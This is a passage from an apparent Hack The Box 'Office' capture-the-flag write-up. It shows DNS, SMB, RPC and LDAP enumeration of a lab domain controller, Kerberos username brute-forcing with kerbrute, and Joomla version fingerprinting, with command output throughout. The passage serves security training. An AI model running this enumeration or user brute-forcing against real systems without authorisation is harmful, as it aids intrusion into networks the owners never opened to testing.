<span class=line><span style=color:#e1e4e8>; </span><span style=color:#f97583>&#x3C;&#x3C;</span><span style=color:#9ecbff>>></span><span style=color:#b392f0> DiG</span><span style=color:#9ecbff> 9.19.21-1-Debian</span><span style=color:#f97583> &#x3C;&#x3C;</span><span style=color:#9ecbff>>></span><span style=color:#b392f0> axfr</span><span style=color:#9ecbff> office.htb</span><span style=color:#9ecbff> @10.10.11.3</span></span>
<span class=line><span style=color:#9ecbff>;; global options: +cmd</span></span>
<span class=line><span style=color:#9ecbff>; Transfer failed.</span></span>
<span class=line></span></code></pre><blockquote><p>Tip: I always recommend performing an <code>any</code> query on the DNS service because it’s possible to find additional IPs for the target, especially if it is <code>dual-homed</code>, meaning it has two network interfaces. In this case, it can be observed that in addition to the IP <code>10.10.11.3</code>, the target also has the IP <code>10.250.0.30</code>. This information will be used later on. {: .prompt-tip }</p></blockquote><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>dig</span><span style=color:#9ecbff> any</span><span style=color:#9ecbff> office.htb</span><span style=color:#9ecbff> @10.10.11.3</span></span>
<span class=line></span>
<span class=line><span style=color:#e1e4e8>; </span><span style=color:#f97583>&#x3C;&#x3C;</span><span style=color:#9ecbff>>></span><span style=color:#b392f0> DiG</span><span style=color:#9ecbff> 9.19.21-1-Debian</span><span style=color:#f97583> &#x3C;&#x3C;</span><span style=color:#9ecbff>>></span><span style=color:#b392f0> any</span><span style=color:#9ecbff> office.htb</span><span style=color:#9ecbff> @10.10.11.3</span></span>
<span class=line><span style=color:#9ecbff>;; global options: +cmd</span></span>
<span class=line><span style=color:#9ecbff>;; Got answer:</span></span>
<span class=line><span style=color:#9ecbff>;; ->>HEADER&#x3C;&#x3C;- opcode: QUERY, status: NOERROR, id: 20261</span></span>
<span class=line><span style=color:#9ecbff>;; flags: qr aa rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 2</span></span>
<span class=line></span>
<span class=line><span style=color:#9ecbff>;; OPT PSEUDOSECTION:</span></span>
<span class=line><span style=color:#9ecbff>; EDNS: version: 0, flags:; udp: 4000</span></span>
<span class=line><span style=color:#9ecbff>;; QUESTION SECTION:</span></span>
<span class=line><span style=color:#9ecbff>;office.htb.			IN	ANY</span></span>
<span class=line></span>
<span class=line><span style=color:#9ecbff>;; ANSWER SECTION:</span></span>
<span class=line><span style=color:#9ecbff>office.htb.		600	IN	A	10.250.0.30</span></span>
<span class=line><span style=color:#9ecbff>office.htb.		600	IN	A	10.10.11.3</span></span>
<span class=line><span style=color:#9ecbff>office.htb.		3600	IN	NS	dc.office.htb.</span></span>
<span class=line><span style=color:#9ecbff>office.htb.		3600	IN	SOA	dc.office.htb. hostmaster.office.htb. 64 900 600 86400 3600</span></span>
<span class=line></span>
<span class=line><span style=color:#9ecbff>;; ADDITIONAL SECTION:</span></span>
<span class=line><span style=color:#9ecbff>dc.office.htb.		3600	IN	A	10.10.11.3</span></span>
<span class=line></span>
<span class=line><span style=color:#9ecbff>;; Query time: 119 msec</span></span>
<span class=line><span style=color:#9ecbff>;; SERVER: 10.10.11.3#53(10.10.11.3) (TCP)</span></span>
<span class=line><span style=color:#9ecbff>;; WHEN: Wed Jun 19 09:43:25 EDT 2024</span></span>
<span class=line><span style=color:#9ecbff>;; MSG SIZE  rcvd: 151</span></span>
<span class=line></span></code></pre><ul><li><strong>SMB Enumeration</strong></li></ul><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>smbmap</span><span style=color:#79b8ff> -u</span><span style=color:#9ecbff> 'notexist'</span><span style=color:#79b8ff> -H</span><span style=color:#79b8ff> 10.10.11.3</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>    ________</span><span style=color:#9ecbff>  ___</span><span style=color:#9ecbff>      ___</span><span style=color:#9ecbff>  _______</span><span style=color:#9ecbff>   ___</span><span style=color:#9ecbff>      ___</span><span style=color:#9ecbff>       __</span><span style=color:#9ecbff>         _______</span></span>
<span class=line><span style=color:#b392f0>   /</span><span style=color:#b392f0>"       )|"</span><span style=color:#79b8ff>  \ </span><span style=color:#9ecbff>   /"  ||   _  "</span><span style=color:#79b8ff>\ </span><span style=color:#f97583>|</span><span style=color:#b392f0>"  \    /"</span><span style=color:#f97583>  |</span><span style=color:#b392f0>     /</span><span style=color:#b392f0>""</span><span style=color:#b392f0>\</span><span style=color:#f97583>       |</span><span style=color:#b392f0>   __</span><span style=color:#9ecbff> "</span><span style=color:#79b8ff>\</span></span>
<span class=line><span style=color:#9ecbff>  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)</span></span>
<span class=line><span style=color:#9ecbff>   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/</span></span>
<span class=line><span style=color:#9ecbff>    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /</span></span>
<span class=line><span style=color:#9ecbff>   /"</span><span style=color:#79b8ff> \ </span><span style=color:#9ecbff>  :</span><span style=color:#e1e4e8>) </span><span style=color:#f97583>|</span><span style=color:#79b8ff>.</span><span style=color:#79b8ff>  \ </span><span style=color:#9ecbff>   /:</span><span style=color:#f97583>  ||</span><span style=color:#79b8ff>:</span><span style=color:#f97583> |</span><span style=color:#b392f0>_</span><span style=color:#e1e4e8>)  :)</span><span style=color:#f97583>|</span><span style=color:#79b8ff>.</span><span style=color:#79b8ff>  \ </span><span style=color:#9ecbff>   /:</span><span style=color:#f97583>  |</span><span style=color:#b392f0> /</span><span style=color:#9ecbff>   /</span><span style=color:#79b8ff>  \ </span><span style=color:#79b8ff>  \ </span><span style=color:#9ecbff> /</span><span style=color:#f97583>|</span><span style=color:#b392f0>__/</span><span style=color:#79b8ff> \</span></span>
<span class=line><span style=color:#e1e4e8>  (_______/  </span><span style=color:#f97583>|</span><span style=color:#b392f0>___</span><span style=color:#f97583>|</span><span style=color:#b392f0>\__/</span><span style=color:#f97583>|</span><span style=color:#b392f0>___</span><span style=color:#f97583>|</span><span style=color:#e1e4e8>(</span><span style=color:#b392f0>_______/</span><span style=color:#f97583> |</span><span style=color:#b392f0>___</span><span style=color:#f97583>|</span><span style=color:#b392f0>\__/</span><span style=color:#f97583>|</span><span style=color:#b392f0>___</span><span style=color:#f97583>|</span><span style=color:#e1e4e8>(</span><span style=color:#b392f0>___/</span><span style=color:#79b8ff>    \_</span><span style=color:#9ecbff>__</span><span style=color:#e1e4e8>)(</span><span style=color:#b392f0>_______</span><span style=color:#e1e4e8>)</span></span>
<span class=line><span style=color:#b392f0> -----------------------------------------------------------------------------</span></span>
<span class=line><span style=color:#b392f0>     SMBMap</span><span style=color:#9ecbff> -</span><span style=color:#9ecbff> Samba</span><span style=color:#9ecbff> Share</span><span style=color:#9ecbff> Enumerator</span><span style=color:#f97583> |</span><span style=color:#b392f0> Shawn</span><span style=color:#9ecbff> Evans</span><span style=color:#9ecbff> -</span><span style=color:#9ecbff> ShawnDEvans@gmail.com</span></span>
<span class=line><span style=color:#b392f0>                     https://github.com/ShawnDEvans/smbmap</span></span>
<span class=line></span>
<span class=line><span style=color:#e1e4e8>[</span><span style=color:#f97583>*</span><span style=color:#e1e4e8>] Detected 1 hosts serving SMB</span></span>
<span class=line><span style=color:#e1e4e8>[</span><span style=color:#f97583>*</span><span style=color:#e1e4e8>] Established 0 SMB session(</span><span style=color:#b392f0>s</span><span style=color:#e1e4e8>)     </span></span>
<span class=line></span></code></pre><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>smbclient</span><span style=color:#79b8ff> -N</span><span style=color:#79b8ff> -L</span><span style=color:#79b8ff> 10.10.11.3</span></span>
<span class=line><span style=color:#b392f0>session</span><span style=color:#9ecbff> setup</span><span style=color:#9ecbff> failed:</span><span style=color:#9ecbff> NT_STATUS_ACCESS_DENIED</span></span>
<span class=line></span></code></pre><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>crackmapexec</span><span style=color:#9ecbff> smb</span><span style=color:#79b8ff> 10.10.11.3</span><span style=color:#79b8ff> -u</span><span style=color:#9ecbff> ''</span><span style=color:#79b8ff> -p</span><span style=color:#9ecbff> ''</span><span style=color:#79b8ff>  --shares</span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.11.3</span><span style=color:#79b8ff>      445</span><span style=color:#9ecbff>    DC</span><span style=color:#e1e4e8>               [*] Windows Server 2022 Build 20348 (</span><span style=color:#b392f0>name:DC</span><span style=color:#e1e4e8>) (</span><span style=color:#b392f0>domain:office.htb</span><span style=color:#e1e4e8>) (</span><span style=color:#b392f0>signing:True</span><span style=color:#e1e4e8>) (</span><span style=color:#b392f0>SMBv1:False</span><span style=color:#e1e4e8>)</span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.11.3</span><span style=color:#79b8ff>      445</span><span style=color:#9ecbff>    DC</span><span style=color:#e1e4e8>               [-] office.htb</span><span style=color:#79b8ff>\:</span><span style=color:#e1e4e8> STATUS_ACCESS_DENIED </span></span>
<span class=line><span style=color:#b392f0>SMB</span><span style=color:#79b8ff>         10.10.11.3</span><span style=color:#79b8ff>      445</span><span style=color:#9ecbff>    DC</span><span style=color:#e1e4e8>               [-] Error enumerating shares: Error occurs </span><span style=color:#f97583>while</span><span style=color:#b392f0> reading</span><span style=color:#9ecbff> from</span><span style=color:#9ecbff> remote</span><span style=color:#e1e4e8>(</span><span style=color:#b392f0>104</span><span style=color:#e1e4e8>)</span></span>
<span class=line></span></code></pre><ul><li><strong>RPC Enumeration</strong></li></ul><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>rpcclient</span><span style=color:#79b8ff> -U</span><span style=color:#9ecbff> '%'</span><span style=color:#79b8ff> -N</span><span style=color:#79b8ff> 10.10.11.3</span></span>
<span class=line><span style=color:#b392f0>Cannot</span><span style=color:#9ecbff> connect</span><span style=color:#9ecbff> to</span><span style=color:#9ecbff> server.</span><span style=color:#9ecbff>  Error</span><span style=color:#9ecbff> was</span><span style=color:#9ecbff> NT_STATUS_ACCESS_DENIED</span></span>
<span class=line></span></code></pre><ul><li><strong>LDAP Enumeration</strong></li></ul><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>ldapsearch</span><span style=color:#79b8ff> -b</span><span style=color:#9ecbff> ""</span><span style=color:#79b8ff> -s</span><span style=color:#9ecbff> base</span><span style=color:#9ecbff> namingContexts</span><span style=color:#79b8ff> -H</span><span style=color:#9ecbff> ldap://10.10.11.3</span><span style=color:#79b8ff> -x</span></span>
<span class=line><span style=color:#6a737d># extended LDIF</span></span>
<span class=line><span style=color:#6a737d>#</span></span>
<span class=line><span style=color:#6a737d># LDAPv3</span></span>
<span class=line><span style=color:#6a737d># base &#x3C;> with scope baseObject</span></span>
<span class=line><span style=color:#6a737d># filter: (objectclass=*)</span></span>
<span class=line><span style=color:#6a737d># requesting: namingContexts </span></span>
<span class=line><span style=color:#6a737d>#</span></span>
<span class=line></span>
<span class=line><span style=color:#6a737d>#</span></span>
<span class=line><span style=color:#b392f0>dn:</span></span>
<span class=line><span style=color:#b392f0>namingContexts:</span><span style=color:#9ecbff> DC=office,DC=htb</span></span>
<span class=line><span style=color:#b392f0>namingContexts:</span><span style=color:#9ecbff> CN=Configuration,DC=office,DC=htb</span></span>
<span class=line><span style=color:#b392f0>namingContexts:</span><span style=color:#9ecbff> CN=Schema,CN=Configuration,DC=office,DC=htb</span></span>
<span class=line><span style=color:#b392f0>namingContexts:</span><span style=color:#9ecbff> DC=DomainDnsZones,DC=office,DC=htb</span></span>
<span class=line><span style=color:#b392f0>namingContexts:</span><span style=color:#9ecbff> DC=ForestDnsZones,DC=office,DC=htb</span></span>
<span class=line></span>
<span class=line><span style=color:#6a737d># search result</span></span>
<span class=line><span style=color:#b392f0>search:</span><span style=color:#79b8ff> 2</span></span>
<span class=line><span style=color:#b392f0>result:</span><span style=color:#79b8ff> 0</span><span style=color:#9ecbff> Success</span></span>
<span class=line></span>
<span class=line><span style=color:#6a737d># numResponses: 2</span></span>
<span class=line><span style=color:#6a737d># numEntries: 1</span></span>
<span class=line></span></code></pre><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>ldapsearch</span><span style=color:#79b8ff> -b</span><span style=color:#9ecbff> "DC=office,DC=htb"</span><span style=color:#79b8ff> -H</span><span style=color:#9ecbff> ldap://10.10.11.3</span><span style=color:#79b8ff> -x</span></span>
<span class=line><span style=color:#6a737d># extended LDIF</span></span>
<span class=line><span style=color:#6a737d>#</span></span>
<span class=line><span style=color:#6a737d># LDAPv3</span></span>
<span class=line><span style=color:#6a737d># base &#x3C;DC=office,DC=htb> with scope subtree</span></span>
<span class=line><span style=color:#6a737d># filter: (objectclass=*)</span></span>
<span class=line><span style=color:#6a737d># requesting: ALL</span></span>
<span class=line><span style=color:#6a737d>#</span></span>
<span class=line></span>
<span class=line><span style=color:#6a737d># search result</span></span>
<span class=line><span style=color:#b392f0>search:</span><span style=color:#79b8ff> 2</span></span>
<span class=line><span style=color:#b392f0>result:</span><span style=color:#79b8ff> 1</span><span style=color:#9ecbff> Operations</span><span style=color:#9ecbff> error</span></span>
<span class=line><span style=color:#b392f0>text:</span><span style=color:#9ecbff> 000004DC:</span><span style=color:#9ecbff> LdapErr:</span><span style=color:#9ecbff> DSID-0C090CF8,</span><span style=color:#9ecbff> comment:</span><span style=color:#9ecbff> In</span><span style=color:#9ecbff> order</span><span style=color:#9ecbff> to</span><span style=color:#9ecbff> perform</span><span style=color:#9ecbff> this</span><span style=color:#9ecbff> opera</span></span>
<span class=line><span style=color:#b392f0> tion</span><span style=color:#9ecbff> a</span><span style=color:#9ecbff> successful</span><span style=color:#9ecbff> bind</span><span style=color:#9ecbff> must</span><span style=color:#9ecbff> be</span><span style=color:#9ecbff> completed</span><span style=color:#9ecbff> on</span><span style=color:#9ecbff> the</span><span style=color:#9ecbff> connection.,</span><span style=color:#9ecbff> data</span><span style=color:#9ecbff> 0,</span><span style=color:#9ecbff> v4f7c</span></span>
<span class=line></span></code></pre><ul><li><strong>Kerberos Enumeration</strong>: Since this is a CTF, it’s advisable to use a list such as <code>xato-net-10-million-usernames.txt</code> for enumerating users with <code>kerbrute</code>. This list contains <code>8295455</code> usernames, so it will take some time. I recommend running it in the background while we continue enumerating the interesting services.</li></ul><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>kerbrute</span><span style=color:#9ecbff> userenum</span><span style=color:#79b8ff> -d</span><span style=color:#9ecbff> OFFICE.HTB</span><span style=color:#79b8ff> --dc</span><span style=color:#79b8ff> 10.10.11.3</span><span style=color:#9ecbff> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>    __</span><span style=color:#9ecbff>             __</span><span style=color:#9ecbff>               __</span><span style=color:#e1e4e8>     </span></span>
<span class=line><span style=color:#b392f0>   /</span><span style=color:#9ecbff> /_____</span><span style=color:#9ecbff>  _____/</span><span style=color:#9ecbff> /_</span><span style=color:#9ecbff>  _______</span><span style=color:#9ecbff>  __/</span><span style=color:#9ecbff> /____</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#b392f0>  /</span><span style=color:#9ecbff> //_/</span><span style=color:#9ecbff> _</span><span style=color:#79b8ff> \/</span><span style=color:#9ecbff> ___/</span><span style=color:#9ecbff> __</span><span style=color:#79b8ff> \/</span><span style=color:#9ecbff> ___/</span><span style=color:#9ecbff> /</span><span style=color:#9ecbff> /</span><span style=color:#9ecbff> /</span><span style=color:#9ecbff> __/</span><span style=color:#9ecbff> _</span><span style=color:#79b8ff> \</span></span>
<span class=line><span style=color:#9ecbff> /</span><span style=color:#9ecbff> ,</span><span style=color:#f97583>&#x3C;</span><span style=color:#9ecbff> /</span><span style=color:#9ecbff>  __/</span><span style=color:#9ecbff> /</span><span style=color:#9ecbff>  /</span><span style=color:#9ecbff> /_/</span><span style=color:#9ecbff> /</span><span style=color:#9ecbff> /</span><span style=color:#9ecbff>  /</span><span style=color:#9ecbff> /_/</span><span style=color:#9ecbff> /</span><span style=color:#9ecbff> /_/</span><span style=color:#9ecbff>  __/</span></span>
<span class=line><span style=color:#b392f0>/_/</span><span style=color:#f97583>|</span><span style=color:#b392f0>_</span><span style=color:#f97583>|</span><span style=color:#b392f0>\___/_/</span><span style=color:#9ecbff>  /_.___/_/</span><span style=color:#79b8ff>   \_</span><span style=color:#9ecbff>_,_/</span><span style=color:#79b8ff>\_</span><span style=color:#9ecbff>_/</span><span style=color:#79b8ff>\_</span><span style=color:#9ecbff>__/</span><span style=color:#e1e4e8>                                        </span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>Version:</span><span style=color:#9ecbff> dev</span><span style=color:#e1e4e8> (9cfb81e) - 06/19/24 - Ronnie Flathers @ropnop</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>2024/06/19</span><span style=color:#9ecbff> 00:28:31</span><span style=color:#f97583> ></span><span style=color:#9ecbff>  Using</span><span style=color:#9ecbff> KDC</span><span style=color:#e1e4e8>(</span><span style=color:#b392f0>s</span><span style=color:#e1e4e8>)</span><span style=color:#9ecbff>:</span></span>
<span class=line><span style=color:#b392f0>2024/06/19</span><span style=color:#9ecbff> 00:28:31</span><span style=color:#f97583> ></span><span style=color:#9ecbff>  	10.10.11.3:88</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>2024/06/19</span><span style=color:#9ecbff> 00:28:53</span><span style=color:#f97583> ></span><span style=color:#e1e4e8>  [+] VALID USERNAME:	administrator@OFFICE.HTB</span></span>
<span class=line><span style=color:#b392f0>2024/06/19</span><span style=color:#9ecbff> 00:31:12</span><span style=color:#f97583> ></span><span style=color:#e1e4e8>  [+] VALID USERNAME:	Administrator@OFFICE.HTB</span></span>
<span class=line><span style=color:#b392f0>2024/06/19</span><span style=color:#9ecbff> 00:32:21</span><span style=color:#f97583> ></span><span style=color:#e1e4e8>  [+] VALID USERNAME:	ewhite@OFFICE.HTB</span></span>
<span class=line><span style=color:#b392f0>2024/06/19</span><span style=color:#9ecbff> 00:32:21</span><span style=color:#f97583> ></span><span style=color:#e1e4e8>  [+] VALID USERNAME:	etower@OFFICE.HTB</span></span>
<span class=line><span style=color:#b392f0>2024/06/19</span><span style=color:#9ecbff> 00:32:21</span><span style=color:#f97583> ></span><span style=color:#e1e4e8>  [+] VALID USERNAME:	dwolfe@OFFICE.HTB</span></span>
<span class=line><span style=color:#b392f0>2024/06/19</span><span style=color:#9ecbff> 00:32:22</span><span style=color:#f97583> ></span><span style=color:#e1e4e8>  [+] VALID USERNAME:	dmichael@OFFICE.HTB</span></span>
<span class=line><span style=color:#b392f0>2024/06/19</span><span style=color:#9ecbff> 00:32:22</span><span style=color:#f97583> ></span><span style=color:#e1e4e8>  [+] VALID USERNAME:	dlanor@OFFICE.HTB</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>2024/06/19</span><span style=color:#9ecbff> 00:42:34</span><span style=color:#f97583> ></span><span style=color:#9ecbff>  Done!</span><span style=color:#9ecbff> Tested</span><span style=color:#79b8ff> 67339</span><span style=color:#9ecbff> usernames</span><span style=color:#e1e4e8> (7 </span><span style=color:#9ecbff>valid</span><span style=color:#e1e4e8>) in 843.388 seconds</span></span>
<span class=line></span></code></pre><ul><li>After a general reconnaissance of the typical services present on a Domain Controller, the pentester began to analyze the Joomla CMS (port 80) reported by the <code>nmap</code> scan. This site appears to be a blog centered around <code>Iron Man</code>, detailing aspects of the technologies it uses, armor design, etc.</li></ul><p><img alt=img decoding=async height=791 loading=lazy src=/_astro/Pasted%20image%2020240618233623.CLkAYfFT_1NFQkt.webp width=1059></p><ul><li>The first thing he did was obtain the Joomla version, which is why he accessed <code>/administrator/manifests/files/joomla.xml</code> and discovered it was version <code>4.2.7</code>.</li></ul><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>curl</span><span style=color:#79b8ff> -s</span><span style=color:#9ecbff> http://office.htb/administrator/manifests/files/joomla.xml</span><span style=color:#f97583> |</span><span style=color:#b392f0> xmllint</span><span style=color:#79b8ff> --format</span><span style=color:#9ecbff> -</span></span>
<span class=line></span></code></pre><pre class="astro-code github-dark" data-language=xml style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#e1e4e8>&#x3C;?</span><span style=color:#85e89d>xml</span><span style=color:#b392f0> version</span><span style=color:#e1e4e8>=</span><span style=color:#9ecbff>"1.0"</span><span style=color:#b392f0> encoding</span><span style=color:#e1e4e8>=</span><span style=color:#9ecbff>"UTF-8"</span><span style=color:#e1e4e8>?></span></span>
<span class=line><span style=color:#e1e4e8>&#x3C;</span><span style=color:#85e89d>extension</span><span style=color:#b392f0> type</span><span style=color:#e1e4e8>=</span><span style=color:#9ecbff>"file"</span><span style=color:#b392f0> method</span><span style=color:#e1e4e8>=</span><span style=color:#9ecbff>"upgrade"</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>  &#x3C;</span><span style=color:#85e89d>name</span><span style=color:#e1e4e8>>files_joomla&#x3C;/</span><span style=color:#85e89d>name</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>  &#x3C;</span><span style=color:#85e89d>author</span><span style=color:#e1e4e8>>Joomla! Project&#x3C;/</span><span style=color:#85e89d>author</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>  &#x3C;</span><span style=color:#85e89d>authorEmail</span><span style=color:#e1e4e8>>admin@joomla.org&#x3C;/</span><span style=color:#85e89d>authorEmail</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>  &#x3C;</span><span style=color:#85e89d>authorUrl</span><span style=color:#e1e4e8>>www.joomla.org&#x3C;/</span><span style=color:#85e89d>authorUrl</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>  &#x3C;</span><span style=color:#85e89d>copyright</span><span style=color:#e1e4e8>>(C) 2019 Open Source Matters, Inc.&#x3C;/</span><span style=color:#85e89d>copyright</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>  &#x3C;</span><span style=color:#85e89d>license</span><span style=color:#e1e4e8>>GNU General Public License version 2 or later; see LICENSE.txt&#x3C;/</span><span style=color:#85e89d>license</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>  &#x3C;</span><span style=color:#85e89d>version</span><span style=color:#e1e4e8>>4.2.7&#x3C;/</span><span style=color:#85e89d>version</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>  &#x3C;</span><span style=color:#85e89d>creationDate</span><span style=color:#e1e4e8>>2023-01&#x3C;/</span><span style=color:#85e89d>creationDate</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>  &#x3C;</span><span style=color:#85e89d>description</span><span style=color:#e1e4e8>>FILES_JOOMLA_XML_DESCRIPTION&#x3C;/</span><span style=color:#85e89d>description</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>  &#x3C;</span><span style=color:#85e89d>scriptfile</span><span style=color:#e1e4e8>>administrator/components/com_admin/script.php&#x3C;/</span><span style=color:#85e89d>scriptfile</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>  &#x3C;</span><span style=color:#85e89d>update</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>    &#x3C;</span><span style=color:#85e89d>schemas</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>      &#x3C;</span><span style=color:#85e89d>schemapath</span><span style=color:#b392f0> type</span><span style=color:#e1e4e8>=</span><span style=color:#9ecbff>"mysql"</span><span style=color:#e1e4e8>>administrator/components/com_admin/sql/updates/mysql&#x3C;/</span><span style=color:#85e89d>schemapath</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>      &#x3C;</span><span style=color:#85e89d>schemapath</span><span style=color:#b392f0> type</span><span style=color:#e1e4e8>=</span><span style=color:#9ecbff>"postgresql"</span><span style=color:#e1e4e8>>administrator/components/com_admin/sql/updates/postgresql&#x3C;/</span><span style=color:#85e89d>schemapath</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>    &#x3C;/</span><span style=color:#85e89d>schemas</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>  &#x3C;/</span><span style=color:#85e89d>update</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>  &#x3C;</span><span style=color:#85e89d>fileset</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>    &#x3C;</span><span style=color:#85e89d>files</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>      &#x3C;</span><span style=color:#85e89d>folder</span><span style=color:#e1e4e8>>administrator&#x3C;/</span><span style=color:#85e89d>folder</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>      &#x3C;</span><span style=color:#85e89d>folder</span><span style=color:#e1e4e8>>api&#x3C;/</span><span style=color:#85e89d>folder</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>      &#x3C;</span><span style=color:#85e89d>folder</span><span style=color:#e1e4e8>>cache&#x3C;/</span><span style=color:#85e89d>folder</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>      &#x3C;</span><span style=color:#85e89d>folder</span><span style=color:#e1e4e8>>cli&#x3C;/</span><span style=color:#85e89d>folder</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>      &#x3C;</span><span style=color:#85e89d>folder</span><span style=color:#e1e4e8>>components&#x3C;/</span><span style=color:#85e89d>folder</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>      &#x3C;</span><span style=color:#85e89d>folder</span><span style=color:#e1e4e8>>images&#x3C;/</span><span style=color:#85e89d>folder</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>      &#x3C;</span><span style=color:#85e89d>folder</span><span style=color:#e1e4e8>>includes&#x3C;/</span><span style=color:#85e89d>folder</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>      &#x3C;</span><span style=color:#85e89d>folder</span><span style=color:#e1e4e8>>language&#x3C;/</span><span style=color:#85e89d>folder</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>      &#x3C;</span><span style=color:#85e89d>folder</span><span style=color:#e1e4e8>>layouts&#x3C;/</span><span style=color:#85e89d>folder</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>      &#x3C;</span><span style=color:#85e89d>folder</span><span style=color:#e1e4e8>>libraries&#x3C;/</span><span style=color:#85e89d>folder</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>      &#x3C;</span><span style=color:#85e89d>folder</span><span style=color:#e1e4e8>>media&#x3C;/</span><span style=color:#85e89d>folder</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>      &#x3C;</span><span style=color:#85e89d>folder</span><span style=color:#e1e4e8>>modules&#x3C;/</span><span style=color:#85e89d>folder</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>      &#x3C;</span><span style=color:#85e89d>folder</span><span style=color:#e1e4e8>>plugins&#x3C;/</span><span style=color:#85e89d>folder</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>      &#x3C;</span><span style=color:#85e89d>folder</span><span style=color:#e1e4e8>>templates&#x3C;/</span><span style=color:#85e89d>folder</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>      &#x3C;</span><span style=color:#85e89d>folder</span><span style=color:#e1e4e8>>tmp&#x3C;/</span><span style=color:#85e89d>folder</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>      &#x3C;</span><span style=color:#85e89d>file</span><span style=color:#e1e4e8>>htaccess.txt&#x3C;/</span><span style=color:#85e89d>file</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>      &#x3C;</span><span style=color:#85e89d>file</span><span style=color:#e1e4e8>>web.config.txt&#x3C;/</span><span style=color:#85e89d>file</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>      &#x3C;</span><span style=color:#85e89d>file</span><span style=color:#e1e4e8>>LICENSE.txt&#x3C;/</span><span style=color:#85e89d>file</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>      &#x3C;</span><span style=color:#85e89d>file</span><span style=color:#e1e4e8>>README.txt&#x3C;/</span><span style=color:#85e89d>file</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#e1e4e8>      &#x3C;</span><span style=color:#85e89d>file</span><span style=color:#e1e4e8>>index.php&#x3C;/</span><span style=color:#85e89d>file</span><span style=color:#e1e4e8>></span></span>
